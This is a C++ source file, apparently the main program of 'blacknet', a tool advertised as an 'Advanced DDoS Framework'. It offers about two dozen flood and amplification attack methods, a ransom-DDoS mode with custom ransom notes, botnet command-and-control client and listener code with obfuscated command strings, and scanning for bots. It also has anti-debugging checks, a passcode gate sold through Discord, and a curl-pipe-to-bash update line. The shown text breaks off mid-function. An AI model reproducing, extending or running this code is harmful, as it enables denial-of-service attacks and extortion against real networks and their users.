#include "../include/AttackEngine.h"
#include "../include/ProxyManager.h"
#include "../include/GeoLocator.h"
#include "../include/BotManager.h"
#include "../include/Utilities.h"
#include "../include/Obfuscate.h"
#include <openssl/sha.h>
#include <iostream>
#include <csignal>
#include <cstdlib>
#include <thread>
#include <chrono>
#include <atomic>
#include <getopt.h>
#include <iomanip>
#include <cstring>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fstream>
#include <vector>
#include <map>
#include <algorithm>
#include <sstream>
#include <cstdio>
#ifdef ENABLE_GUI
#include "../include/GUI.h"
#include <QMessageBox>
#endif

using namespace std;

static const char* VERSION = "2.0.1";
static const char* GITHUB_REPO = "https://github.com/lolhecks529/blacknet";

static atomic<bool> running(true);
static AttackEngine* attack_engine = nullptr;
static BotManager* bot_manager = nullptr;

void signal_handler(int signal) {
    if (!running.exchange(false)) return;
    cout << "\n[!] Received signal " << signal << ". Shutting down..." << endl;
    if (attack_engine) {
        attack_engine->stop_attack();
    }
    if (bot_manager) {
        bot_manager->stop_ddos();
    }
    running = false;
}

void print_banner() {
    cout << "\n";
    cout << R"(  ╔══════════════════════════════════════════════════════════════╗)" << endl;
    cout << R"(  ║                                                              ║)" << endl;
    cout << R"(  ║   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ║)" << endl;
    cout << R"(  ║   ███╗   ██╗███████╗██╗    ██╗███████╗███╗   ██╗████████╗  ║)" << endl;
    cout << R"(  ║   ████╗  ██║██╔════╝██║    ██║██╔════╝████╗  ██║╚══██╔══╝  ║)" << endl;
    cout << R"(  ║   ██╔██╗ ██║█████╗  ██║ █╗ ██║█████╗  ██╔██╗ ██║   ██║     ║)" << endl;
    cout << R"(  ║   ██║╚██╗██║██╔══╝  ██║███╗██║██╔══╝  ██║╚██╗██║   ██║     ║)" << endl;
    cout << R"(  ║   ██║ ╚████║███████╗╚███╔███╔╝███████╗██║ ╚████║   ██║     ║)" << endl;
    cout << R"(  ║   ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝     ║)" << endl;
    cout << R"(  ║                                                              ║)" << endl;
    cout << R"(  ║                    Advanced DDoS Framework                   ║)" << endl;
    cout << R"(  ║                                                              ║)" << endl;
    cout << R"(  ╚══════════════════════════════════════════════════════════════╝)" << endl;
    cout << "\n";
    cout << "  blacknet " << VERSION << "  --  " << GITHUB_REPO << "\n";
    cout << "\n";
}

void print_usage() {
    cout << "Usage: blacknet [OPTIONS] <target>\n\n";
    cout << "Options:\n";
    cout << "  -h, --help                  Show this help message\n";
    cout << "  -V, --version               Show version\n";
    cout << "  --update                    Check for and install updates\n";
    cout << "  -m, --method METHOD         Attack method (see list below)\n";
    cout << "  -p, --port PORT             Target port (default: 80)\n";
    cout << "  -t, --threads N             Number of threads (default: 100)\n";
    cout << "  -d, --duration SEC          Attack duration in seconds (0 = infinite)\n";
    cout << "  -r, --rate RATE             Packets per second (default: 1000)\n";
    cout << "  -s, --size SIZE             Packet size in bytes (default: 1024)\n";
    cout << "  -n, --packets N             Total packet limit (default: 10000, 0=unlimited)\n";
    cout << "  -D, --data SIZE             Total data limit (e.g. 100MB, 2GB, 1TB)\n";
    cout << "  --hit-run ATTACK:SLEEP      Hit & Run mode (e.g. 30:10)\n";
    cout << "  --rdos                      Ransom DDoS mode\n";
    cout << "  --ransom-note FILE          Custom ransom note file for RDoS\n";
    cout << "  -P, --proxy FILE            Use proxy list from file\n";
    cout << "  -g, --geo COUNTRY           Target specific country\n";
    cout << "  -b, --botnet                Enable botnet mode\n";
    cout << "  -c, --c2 SERVER:PORT        C2 server for botnet (default port: 80)\n";
    cout << "  --add-bot IP:PORT           Add a bot to the list (repeatable)\n";
    cout << "  --remove-bot ID             Remove a bot by its ID\n";
    cout << "  --list-bots                 List all managed bots\n";
    cout << "  --save-bots FILE            Save bot list to JSON file\n";
    cout << "  --load-bots FILE            Load bot list from JSON file\n";
    cout << "  --connect IP:PORT           Run in bot client mode (connect to C2)\n";
    cout << "  --bot-client IP:PORT        Same as --connect\n";
    cout << "  --listen [PORT]             Bot listener mode (default: 80)\n";
    cout << "  --socks5 PROXY:PORT         SOCKS5 proxy for C2 connection\n";
    cout << "  --scan-network CIDR         Scan network for bots (e.g. 192.168.1.0/24)\n";
    cout << "  --bot-port PORT             Bot listener port for scanning (default: 80)\n";
    cout << "  --rand-source               Randomize source IP\n";
    cout << "  --rand-port                 Randomize source port\n";
    cout << "  --no-proxy                  Disable proxy rotation\n";
    cout << "  --verbose                   Enable verbose output\n";
    cout << "  --stats                     Show attack statistics\n";
    cout << "  --ipv4                      Force IPv4\n";
    cout << "  --ipv6                      Force IPv6\n";
    cout << "  --both                      Use both IPv4 and IPv6\n";
    cout << "\n";
    cout << "Attack Methods:\n";
    cout << "  udp          UDP flood (volumetric)\n";
    cout << "  tcp          TCP flood (volumetric)\n";
    cout << "  syn          TCP SYN flood (protocol, requires root)\n";
    cout << "  ack          TCP ACK flood (protocol, requires root)\n";
    cout << "  tcpconn      TCP connect flood (application)\n";
    cout << "  http         HTTP/1.1 GET flood (application)\n";
    cout << "  httpget      HTTP/1.1 GET flood (alias)\n";
    cout << "  httppost     HTTP/1.1 POST flood (application)\n";
    cout << "  post         HTTP/1.1 POST flood (alias)\n";
    cout << "  https        HTTPS/TLS 1.2+ flood (application)\n";
    cout << "  http2        HTTP/2 flood (application)\n";
    cout << "  ws           WebSocket flood (application)\n";
    cout << "  icmp         ICMP echo flood (volumetric, requires root)\n";
    cout << "  slowloris    Slowloris (application)\n";
    cout << "  dns          DNS amplification\n";
    cout << "  ntp          NTP amplification\n";
    cout << "  mem          Memcached amplification\n";
    cout << "  ssdp         SSDP amplification\n";
    cout << "  snmp         SNMP amplification\n";
    cout << "  mdns         mDNS amplification\n";
    cout << "  cldap        CLDAP amplification\n";
    cout << "  chargen      CharGen amplification\n";
    cout << "  qotd         Quote of the Day amplification\n";
    cout << "  rdp          RDP amplification\n";
    cout << "  coap         CoAP amplification\n";
    cout << "\n";
    cout << "  Multi-vector: combine with + (e.g. udp+http+dns)\n";
    cout << "\n";
    cout << "Examples:\n";
    cout << "  blacknet -m udp -t 500 -d 60 192.168.1.1\n";
    cout << "  blacknet -m http -p 443 example.com\n";
    cout << "  blacknet -m tcp -g US -t 200 8.8.8.8\n";
    cout << "  blacknet -b -c 192.168.1.100:4444\n";
    cout << "  blacknet --add-bot 10.0.0.5:4444 --add-bot 10.0.0.6:4444 -m udp target.com\n";
    cout << "  blacknet --connect 192.168.1.100:4444\n";
    cout << "  blacknet --listen 4444\n";
    cout << "\n";
}

void print_stats(const AttackEngine& engine) {
    auto stats = engine.get_stats();
    cout << "\n";
    cout << "  ═══════════════════════════════════════════════════════════════\n";
    cout << "                      ATTACK STATISTICS\n";
    cout << "  ═══════════════════════════════════════════════════════════════\n";
    cout << "  Packets Sent:      " << Utilities::format_number(stats.packets_sent) << "\n";
    cout << "  Bytes Sent:        " << Utilities::format_bytes(stats.bytes_sent) << "\n";
    cout << "  Attack Duration:   " << Utilities::format_duration(stats.duration) << "\n";
    cout << "  Current Rate:      " << Utilities::format_bps(stats.current_bps) << "\n";
    cout << "  Peak Rate:         " << Utilities::format_bps(stats.peak_bps) << "\n";
    cout << "  Active Threads:    " << stats.active_threads << "\n";
    cout << "  ═══════════════════════════════════════════════════════════════\n";
    cout << "\n";
}

void print_lockout() {
    cout << "\n";
    cout << "  ╔══════════════════════════════════════════════════════════════╗\n";
    cout << "  ║                                                              ║\n";
    cout << "  ║                  ACCESS DENIED -- LOCKED OUT                  ║\n";
    cout << "  ║                                                              ║\n";
    cout << "  ║  You have exceeded the maximum number of passcode attempts.  ║\n";
    cout << "  ║                                                              ║\n";
    cout << "  ║  Contact the developer on Discord to obtain a valid code.    ║\n";
    cout << "  ║                                                              ║\n";
    cout << "  ║  Discord: 5296                                                  ║\n";
    cout << "  ║                                                              ║\n";
    cout << "  ╚══════════════════════════════════════════════════════════════╝\n";
    cout << "\n";
}

int get_attack_method_index(const string& method_name) {
    if (method_name == "udp") return 0;
    if (method_name == "tcp") return 1;
    if (method_name == "syn") return 2;
    if (method_name == "ack") return 3;
    if (method_name == "tcpconn") return 4;
    if (method_name == "http") return 5;
    if (method_name == "httpget") return 6;
    if (method_name == "httppost") return 7;
    if (method_name == "post") return 8;
    if (method_name == "https") return 9;
    if (method_name == "http2") return 10;
    if (method_name == "ws") return 11;
    if (method_name == "icmp") return 12;
    if (method_name == "slowloris") return 13;
    if (method_name == "dns") return 14;
    if (method_name == "ntp") return 15;
    if (method_name == "mem") return 16;
    if (method_name == "ssdp") return 17;
    if (method_name == "snmp") return 18;
    if (method_name == "mdns") return 19;
    if (method_name == "cldap") return 20;
    if (method_name == "chargen") return 21;
    if (method_name == "qotd") return 22;
    if (method_name == "rdp") return 23;
    if (method_name == "coap") return 24;
    return -1;
}

string get_method_description(const string& method_name) {
    if (method_name == "udp") return "UDP flood";
    if (method_name == "tcp") return "TCP flood";
    if (method_name == "syn") return "TCP SYN flood";
    if (method_name == "ack") return "TCP ACK flood";
    if (method_name == "tcpconn") return "TCP connect flood";
    if (method_name == "http") return "HTTP GET flood";
    if (method_name == "httpget") return "HTTP GET flood";
    if (method_name == "httppost") return "HTTP POST flood";
    if (method_name == "post") return "HTTP POST flood";
    if (method_name == "https") return "HTTPS flood";
    if (method_name == "http2") return "HTTP/2 flood";
    if (method_name == "ws") return "WebSocket flood";
    if (method_name == "icmp") return "ICMP echo flood";
    if (method_name == "slowloris") return "Slowloris";
    if (method_name == "dns") return "DNS amplification";
    if (method_name == "ntp") return "NTP amplification";
    if (method_name == "mem") return "Memcached amplification";
    if (method_name == "ssdp") return "SSDP amplification";
    if (method_name == "snmp") return "SNMP amplification";
    if (method_name == "mdns") return "mDNS amplification";
    if (method_name == "cldap") return "CLDAP amplification";
    if (method_name == "chargen") return "CharGen amplification";
    if (method_name == "qotd") return "QOTD amplification";
    if (method_name == "rdp") return "RDP amplification";
    if (method_name == "coap") return "CoAP amplification";
    return "unknown";
}

bool is_tls_method(const string& method) {
    return (method == "https" || method == "http2" || method == "ws");
}

void print_method_list() {
    cout << "  Available methods:\n";
    cout << "    udp, tcp, syn, ack, tcpconn,\n";
    cout << "    http, httpget, httppost, post, https, http2, ws,\n";
    cout << "    icmp, slowloris,\n";
    cout << "    dns, ntp, mem, ssdp, snmp, mdns, cldap, chargen, qotd, rdp, coap\n";
}

void print_update_info() {
    cout << "[+] Checking for updates from " << GITHUB_REPO << " ..." << endl;
    cout << "[+] Latest release: https://github.com/lolhecks529/blacknet/releases/latest" << endl;
    cout << "[+] To update manually, run:" << endl;
    cout << "    curl -fsSL https://raw.githubusercontent.com/lolhecks529/blacknet/master/update.sh | bash" << endl;
}

int main(int argc, char* argv[]) {
    for (int i = 1; i < argc; i++) {
        if (string(argv[i]) == "-V" || string(argv[i]) == "--version") {
            cout << "blacknet " << VERSION << endl;
            return 0;
        }
        if (string(argv[i]) == "-h" || string(argv[i]) == "--help") {
            print_banner();
            print_usage();
            return 0;
        }
    }

    if (Obf::detect_debugger()) {
        cerr << "[-] Debugger detected, exiting." << endl;
        return 1;
    }

    const int MAX_ATTEMPTS = 3;
    const string PASSCODE_HASH = "f1ed082f1389c98e9dcf997e0fb083b4c9d73b695cae7c98f02d044a52c64940";
    const string DISCORD_CONTACT = "5296";

    int attempts = 0;
    bool authenticated = false;

    while (attempts < MAX_ATTEMPTS) {
        cout << "Enter passcode (" << (MAX_ATTEMPTS - attempts) << " attempts remaining): ";
        string passcode;
        getline(cin, passcode);

        unsigned char hash[SHA256_DIGEST_LENGTH];
        SHA256((unsigned char*)passcode.c_str(), passcode.size(), hash);

        char hex_hash[SHA256_DIGEST_LENGTH * 2 + 1];
        for (int j = 0; j < SHA256_DIGEST_LENGTH; j++) {
            sprintf(&hex_hash[j * 2], "%02x", hash[j]);
        }
        hex_hash[SHA256_DIGEST_LENGTH * 2] = '\0';

        if (string(hex_hash) == PASSCODE_HASH) {
            authenticated = true;
            break;
        }

        attempts++;
        if (attempts < MAX_ATTEMPTS) {
            cerr << "[-] Incorrect passcode. " << (MAX_ATTEMPTS - attempts) << " attempts remaining." << endl;
        }
    }

    if (!authenticated) {
        print_lockout();
        return 1;
    }

    cout << "[+] Access granted." << endl;
    cout << "[+] Loading blacknet " << VERSION << " ..." << endl;

#ifdef ENABLE_GUI
    bool gui_mode = false;
    if (argc >= 2) {
        string first = argv[1];
        if (first == "g" || first == "gui" || first == "--gui") {
            gui_mode = true;
        }
    }
    if (gui_mode) {
        setenv("QT_QPA_PLATFORM", "xcb", 0);

        QApplication app(argc, argv);

        ProxyManager proxy_manager;
        GeoLocator geo_locator;
        AttackEngine attack_engine_local;
        BotManager bot_manager_local;

        string proxy_path = "resources/proxies.txt";
        cout << "[+] Loading proxies from: " << proxy_path << endl;
        if (!proxy_manager.load_proxies(proxy_path)) {
            cout << "[+] No proxy list found, continuing without proxies" << endl;
        } else {
            cout << "[+] Loaded " << proxy_manager.get_total_proxies() << " proxies" << endl;
        }

        cout << "[+] Loading resources..." << endl;
        attack_engine_local.load_user_agents("resources/useragents.txt");
        attack_engine_local.load_subdomains("resources/subdomains.txt");

        GUI gui(attack_engine_local, proxy_manager, bot_manager_local);
        gui.show();

        return app.exec();
    }
#endif

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    print_banner();

    static struct option long_options[] = {
        {"help", no_argument, 0, 'h'},
        {"version", no_argument, 0, 'V'},
        {"update", no_argument, 0, 0},
        {"method", required_argument, 0, 'm'},
        {"port", required_argument, 0, 'p'},
        {"threads", required_argument, 0, 't'},
        {"duration", required_argument, 0, 'd'},
        {"rate", required_argument, 0, 'r'},
        {"size", required_argument, 0, 's'},
        {"packets", required_argument, 0, 'n'},
        {"data", required_argument, 0, 'D'},
        {"proxy", required_argument, 0, 'P'},
        {"geo", required_argument, 0, 'g'},
        {"botnet", no_argument, 0, 'b'},
        {"c2", required_argument, 0, 'c'},
        {"add-bot", required_argument, 0, 0},
        {"remove-bot", required_argument, 0, 0},
        {"list-bots", no_argument, 0, 0},
        {"save-bots", required_argument, 0, 0},
        {"load-bots", required_argument, 0, 0},
        {"scan-network", required_argument, 0, 0},
        {"bot-port", required_argument, 0, 0},
        {"hit-run", required_argument, 0, 0},
        {"rdos", no_argument, 0, 0},
        {"ransom-note", required_argument, 0, 0},
        {"connect", required_argument, 0, 0},
        {"bot-client", required_argument, 0, 0},
        {"listen", required_argument, 0, 0},
        {"socks5", required_argument, 0, 0},
        {"rand-source", no_argument, 0, 0},
        {"rand-port", no_argument, 0, 0},
        {"no-proxy", no_argument, 0, 0},
        {"verbose", no_argument, 0, 0},
        {"stats", no_argument, 0, 0},
        {"ipv4", no_argument, 0, 0},
        {"ipv6", no_argument, 0, 0},
        {"both", no_argument, 0, 0},
        {0, 0, 0, 0}
    };

    string method = "udp";
    string target;
    int port = 80;
    int threads = 100;
    int duration = 0;
    int rate = 1000;
    int packet_size = 1024;
    long long packet_limit = 10000;
    long long data_limit = 0;
    string data_limit_str;
    string proxy_file;
    string country;
    string c2_server;
    bool use_botnet = false;
    bool random_source = false;
    bool random_port = false;
    bool use_proxy = true;
    bool verbose = false;
    bool show_stats = false;
    AttackEngine::IPVersion ip_version = AttackEngine::IPVersion::IPv4;

    vector<string> add_bot_list;
    string remove_bot_id;
    bool list_bots_flag = false;
    string save_bots_file;
    string load_bots_file;
    string scan_network_cidr;
    int bot_port = 80;
    string hit_run_param;
    bool rdos_mode = false;
    string ransom_note_file;
    string connect_to;
    string socks5_proxy;
    int listen_port = 0;

    int opt;
    int option_index = 0;

    while ((opt = getopt_long(argc, argv, "hm:p:t:d:r:s:n:D:P:g:bc:V", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'h':
                print_usage();
                return 0;
            case 'V':
                cout << "blacknet " << VERSION << endl;
                return 0;
            case 'm':
                method = optarg;
                break;
            case 'p':
                port = stoi(optarg);
                break;
            case 't':
                threads = stoi(optarg);
                break;
            case 'd':
                duration = stoi(optarg);
                break;
            case 'r':
                rate = stoi(optarg);
                break;
            case 's':
                packet_size = stoi(optarg);
                break;
            case 'n':
                packet_limit = stoll(optarg);
                if (packet_limit < 0) packet_limit = 0;
                break;
            case 'D':
                data_limit_str = optarg;
                data_limit = Utilities::parse_data_size(data_limit_str);
                break;
            case 'P':
                proxy_file = optarg;
                break;
            case 'g':
                country = optarg;
                break;
            case 'b':
                use_botnet = true;
                break;
            case 'c':
                c2_server = optarg;
                break;
            case 0: {
                string opt_name = long_options[option_index].name;
                if (opt_name == "update") {
                    print_update_info();
                    return 0;
                } else if (opt_name == "rand-source") {
                    random_source = true;
                } else if (opt_name == "rand-port") {
                    random_port = true;
                } else if (opt_name == "no-proxy") {
                    use_proxy = false;
                } else if (opt_name == "verbose") {
                    verbose = true;
                } else if (opt_name == "stats") {
                    show_stats = true;
                } else if (opt_name == "add-bot") {
                    add_bot_list.push_back(optarg);
                } else if (opt_name == "remove-bot") {
                    remove_bot_id = optarg;
                } else if (opt_name == "list-bots") {
                    list_bots_flag = true;
                } else if (opt_name == "save-bots") {
                    save_bots_file = optarg;
                } else if (opt_name == "load-bots") {
                    load_bots_file = optarg;
                } else if (opt_name == "scan-network") {
                    scan_network_cidr = optarg;
                } else if (opt_name == "bot-port") {
                    bot_port = stoi(optarg);
                } else if (opt_name == "hit-run") {
                    hit_run_param = optarg;
                } else if (opt_name == "rdos") {
                    rdos_mode = true;
                } else if (opt_name == "ransom-note") {
                    ransom_note_file = optarg;
                } else if (opt_name == "connect" || opt_name == "bot-client") {
                    connect_to = optarg;
                } else if (opt_name == "listen") {
                    listen_port = optarg ? stoi(optarg) : bot_port;
                } else if (opt_name == "socks5") {
                    socks5_proxy = optarg;
                } else if (opt_name == "ipv4") {
                    ip_version = AttackEngine::IPVersion::IPv4;
                } else if (opt_name == "ipv6") {
                    ip_version = AttackEngine::IPVersion::IPv6;
                } else if (opt_name == "both") {
                    ip_version = AttackEngine::IPVersion::Both;
                }
                break;
            }
            default:
                print_usage();
                return 1;
        }
    }

    ProxyManager proxy_manager;
    GeoLocator geo_locator;
    AttackEngine attack_engine_local;
    BotManager bot_manager_local;

    attack_engine = &attack_engine_local;
    bot_manager = &bot_manager_local;

    if (use_proxy) {
        string proxy_path = proxy_file.empty() ? "resources/proxies.txt" : proxy_file;
        if (!proxy_manager.load_proxies(proxy_path)) {
            if (!proxy_file.empty()) {
                cerr << "[-] Proxy file: " << proxy_file << " not found" << endl;
            }
        } else {
            cout << "[+] Proxies: " << proxy_manager.get_total_proxies() << " loaded" << endl;
        }
    }

    attack_engine_local.load_user_agents("resources/useragents.txt");
    attack_engine_local.load_subdomains("resources/subdomains.txt");

    if (!load_bots_file.empty()) {
        bot_manager_local.load_bots(load_bots_file);
    }

    for (const auto& entry : add_bot_list) {
        size_t colon = entry.find(':');
        if (colon != string::npos) {
            string bip = entry.substr(0, colon);
            int bport = stoi(entry.substr(colon + 1));
            if (!bot_manager_local.add_bot(bip, bport, true)) {
                cerr << "[-] add-bot failed: " << entry << endl;
            }
        } else {
            cerr << "[-] Bad format (use IP:PORT): " << entry << endl;
        }
    }

    if (!remove_bot_id.empty()) {
        bot_manager_local.remove_bot(remove_bot_id);
    }

    if (list_bots_flag) {
        auto all_bots = bot_manager_local.get_all_bots();
        cout << "\n--- Bots: " << all_bots.size() << " ---" << endl;
        if (all_bots.empty()) {
            cout << "  (none)" << endl;
        } else {
            for (const auto& b : all_bots) {
                string ipp = b.ip + ":" + to_string(b.port);
                cout << "  " << left << setw(20) << ipp
                     << "  " << setw(8) << b.os
                     << "  " << b.country
                     << (b.active ? "  [active]" : "  [inactive]") << endl;
            }
        }
        cout << "---" << endl;
    }

    if (!save_bots_file.empty()) {
        bot_manager_local.save_bots(save_bots_file);
    }

    if (!scan_network_cidr.empty()) {
        bot_manager_local.scan_network(scan_network_cidr, bot_port);
    }

    auto bot_command_loop = [&](int c2_sock, bool do_reconnect,
                                struct sockaddr_in c2_addr, string handshake) {
        char buf[4096];
        string cmd_buf;
        auto last_stats = chrono::steady_clock::now();

        while (running) {
            ssize_t n = recv(c2_sock, buf, sizeof(buf) - 1, 0);
            if (n <= 0) {
                if (!running) break;
                if (!do_reconnect) break;
                cout << "[-] C2 disconnected. Reconnecting..." << endl;
                close(c2_sock);
                this_thread::sleep_for(chrono::seconds(5));
                c2_sock = socket(AF_INET, SOCK_STREAM, 0);
                if (c2_sock < 0) break;
                struct timeval tv;
                tv.tv_sec = 10;
                tv.tv_usec = 0;
                setsockopt(c2_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                setsockopt(c2_sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                if (connect(c2_sock, (struct sockaddr*)&c2_addr, sizeof(c2_addr)) < 0) {
                    close(c2_sock);
                    continue;
                }
                send(c2_sock, handshake.data(), handshake.size(), 0);
                cout << "[+] Reconnected to C2." << endl;
                continue;
            }
            buf[n] = '\0';
            cmd_buf += buf;

            size_t nl;
            while ((nl = cmd_buf.find('\n')) != string::npos) {
                string cmd = cmd_buf.substr(0, nl);
                cmd_buf.erase(0, nl + 1);
                if (cmd.empty()) continue;

                if (cmd.find(OBF("ATTACK").decrypt()) == 0) {
                    istringstream iss(cmd);
                    string tok;
                    vector<string> parts;
                    while (iss >> tok) parts.push_back(tok);

                    if (parts.size() >= 4) {
                        string atk_target = parts[1];
                        int atk_port = stoi(parts[2]);
                        string atk_method = parts[3];
                        int atk_duration = parts.size() > 4 ? stoi(parts[4]) : 0;
                        int atk_intensity = parts.size() > 5 ? stoi(parts[5]) : 100;

                        cout << "[+] ATTACK from C2: " << atk_method << " -> " << atk_target
                             << ":" << atk_port << " dur=" << atk_duration << endl;

                        attack_engine_local.start_attack(atk_target, atk_port, atk_method,
                            atk_intensity / 10, atk_intensity, 1024, false, false,
                            use_proxy ? &proxy_manager : nullptr, 0, 0);
                    }
                } else if (cmd.find(OBF("STOP").decrypt()) == 0) {
                    cout << "[+] STOP from C2" << endl;
                    attack_engine_local.stop_attack();
                } else if (cmd.find(OBF("PING").decrypt()) == 0) {
                    string pong = OBF("PONG").decrypt() + "\n";
                    send(c2_sock, pong.c_str(), pong.size(), 0);
                } else if (cmd.find(OBF("STATS").decrypt()) == 0) {
                    auto s = attack_engine_local.get_stats();
                    string stats = OBF("STATS").decrypt() + " " + OBF("PACKETS:").decrypt() + to_string(s.packets_sent) +
                                    " " + OBF("BYTES:").decrypt() + to_string(s.bytes_sent) + "\n";
                    send(c2_sock, stats.data(), stats.size(), 0);
                } else if (cmd.find(OBF("SET_METHOD").decrypt()) == 0) {
                    istringstream iss(cmd);
                    string tok;
                    vector<string> parts;
                    while (iss >> tok) parts.push_back(tok);
                    if (parts.size() >= 2) {
                        cout << "[+] C2 set method: " << parts[1] << endl;
                    }
                } else if (cmd.find(OBF("SET_TARGET").decrypt()) == 0) {
                    istringstream iss(cmd);
                    string tok;
                    vector<string> parts;
                    while (iss >> tok) parts.push_back(tok);
                    if (parts.size() >= 2) {
                        cout << "[+] C2 set target: " << parts[1] << endl;
                    }
                } else if (cmd.find(OBF("SET_THREADS").decrypt()) == 0) {
                    istringstream iss(cmd);
                    string tok;
                    vector<string> parts;
                    while (iss >> tok) parts.push_back(tok);
                    if (parts.size() >= 2) {
                        cout << "[+] C2 set threads: " << parts[1] << endl;
                    }
                } else if (cmd.find(OBF("STATUS").decrypt()) == 0) {
                    string status = "ALIVE\n";
                    send(c2_sock, status.c_str(), status.size(), 0);
                } else {
                    cout << "[+] Unknown command from C2: " << cmd << endl;
                }
            }

            auto now = chrono::steady_clock::now();
            if (chrono::duration_cast<chrono::seconds>(now - last_stats).count() >= 10) {
                auto s = attack_engine_local.get_stats();
                string stats = OBF("STATS").decrypt() + " " + OBF("PACKETS:").decrypt() + to_string(s.packets_sent) +
                                " " + OBF("BYTES:").decrypt() + to_string(s.bytes_sent) + "\n";
                send(c2_sock, stats.data(), stats.size(), 0);
                last_stats = now;
            }
        }
        attack_engine_local.stop_attack();
        close(c2_sock);
    };

    if (listen_port > 0) {
        int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
        if (listen_fd < 0) {
            perror("[-] Socket");
            return 1;
        }
        int sopt = 1;
        setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &sopt, sizeof(sopt));
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(listen_port);
        if (bind(listen_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            perror("[-] Bind");
            close(listen_fd);
            return 1;
        }
        if (listen(listen_fd, 5) < 0) {
            perror("[-] Listen");
            close(listen_fd);
            return 1;
        }
        cout << "[+] Bot listening on port " << listen_port
             << " for C2 connection requests..." << endl;

        while (running) {
            struct sockaddr_in c2_addr;
            socklen_t c2_len = sizeof(c2_addr);
            int c2_sock = accept(listen_fd, (struct sockaddr*)&c2_addr, &c2_len);
            if (c2_sock < 0) {
                if (running) perror("[-] Accept");
                continue;
            }

            char c2_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &c2_addr.sin_addr, c2_ip, INET_ADDRSTRLEN);
            int c2_port = ntohs(c2_addr.sin_port);

            char recv_buf[256];
            ssize_t n = recv(c2_sock, recv_buf, sizeof(recv_buf) - 1, 0);
            if (n <= 0) {
                close(c2_sock);
                continue;
            }
            recv_buf[n] = '\0';
            string req(recv_buf);

            string c2_listen_port_str = "80";
            size_t c2port_pos = req.find(OBF("C2PORT:").decrypt());
            if (c2port_pos != string::npos) {
                size_t end_pos = req.find('\n', c2port_pos);
                if (end_pos != string::npos) {
                    c2_listen_port_str = req.substr(c2port_pos + 7, end_pos - c2port_pos - 7);
                }
            }

            if (req.find(OBF("BLACKNET_VALIDATE").decrypt()) != string::npos) {
                cout << "\n[!] Incoming C2 connection from " << c2_ip << ":" << c2_port << endl;
                cout << "    Accept this bot connection? (y/n): " << flush;

                string answer;
                getline(cin, answer);
                if (answer == "y" || answer == "Y" || answer == "yes") {
                    cout << "[+] Accepted. Connecting to C2..." << endl;
                    string accepted_msg = OBF("BLACKNET_ACCEPTED").decrypt();
                    send(c2_sock, accepted_msg.c_str(), accepted_msg.size(), 0);
                    close(c2_sock);
                    close(listen_fd);

                    int c2_listen_port = stoi(c2_listen_port_str);
                    cout << "[+] Connecting to " << c2_ip << ":" << c2_listen_port << endl;

                    int out_sock = socket(AF_INET, SOCK_STREAM, 0);
                    if (out_sock < 0) {
                        perror("[-] Socket");
                        return 1;
                    }
                    struct sockaddr_in out_addr;
                    memset(&out_addr, 0, sizeof(out_addr));
                    out_addr.sin_family = AF_INET;
                    out_addr.sin_port = htons(c2_listen_port);
                    inet_pton(AF_INET, c2_ip, &out_addr.sin_addr);
                    struct timeval tv;
                    tv.tv_sec = 10;
                    tv.tv_usec = 0;
                    setsockopt(out_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                    setsockopt(out_sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                    if (connect(out_sock, (struct sockaddr*)&out_addr, sizeof(out_addr)) < 0) {
                        perror("[-] Connection failed");
                        close(out_sock);
                        return 1;
                    }

                    string os_name =
#ifdef _WIN32
                        "Windows";
#elif __APPLE__
                        "macOS";
#elif __linux__
                        "Linux";
#else
                        "Unknown";
#endif
                    string hs = OBF("BLACKNET_BOT").decrypt() + "\n" +
                                OBF("VERSION:").decrypt() + "2.0\n" +
                                OBF("OS:").decrypt() + os_name + "\n" +
                                OBF("PORT:").decrypt() + to_string(bot_port) + "\n\n";
                    send(out_sock, hs.data(), hs.size(), 0);
                    cout << "[+] Registered as bot. Waiting for commands..." << endl;

                    struct sockaddr_in reconnect_addr = out_addr;
                    bot_command_loop(out_sock, true, reconnect_addr, hs);
                    cout << "[+] Bot client shutting down." << endl;
                    return 0;
                } else {
                    string rejected_msg = "REJECTED\n";
                    send(c2_sock, rejected_msg.c_str(), rejected_msg.size(), 0);
                    cout << "[-] Connection rejected." << endl;
                }
            } else {
                cout << "[-] Unknown request from " << c2_ip << endl;
            }
            close(c2_sock);
        }
        close(listen_fd);
        return 0;
    }

    if (!connect_to.empty()) {
        size_t colon = connect_to.find(':');
        if (colon == string::npos) {
            cerr << "[-] Invalid server format. Use IP:PORT" << endl;
            return 1;
        }
        string server_ip = connect_to.substr(0, colon);
        int server_port = stoi(connect_to.substr(colon + 1));

        cout << "[+] Connecting to " << server_ip << ":" << server_port << endl;

        int c2_sock = socket(AF_INET, SOCK_STREAM, 0);
        if (c2_sock < 0) {
            perror("[-] Socket");
            return 1;
        }

        struct sockaddr_in c2_addr;
        memset(&c2_addr, 0, sizeof(c2_addr));
        c2_addr.sin_family = AF_INET;
        c2_addr.sin_port = htons(server_port);
        inet_pton(AF_INET, server_ip.c_str(), &c2_addr.sin_addr);

        struct timeval tv;
        tv.tv_sec = 10;
        tv.tv_usec = 0;
        setsockopt(c2_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(c2_sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        if (connect(c2_sock, (struct sockaddr*)&c2_addr, sizeof(c2_addr)) < 0) {
            perror("[-] Connection failed");
            close(c2_sock);
            return 1;
        }

        string os_name =
#ifdef _WIN32
            "Windows";
#elif __APPLE__
            "macOS";
#elif __linux__
            "Linux";
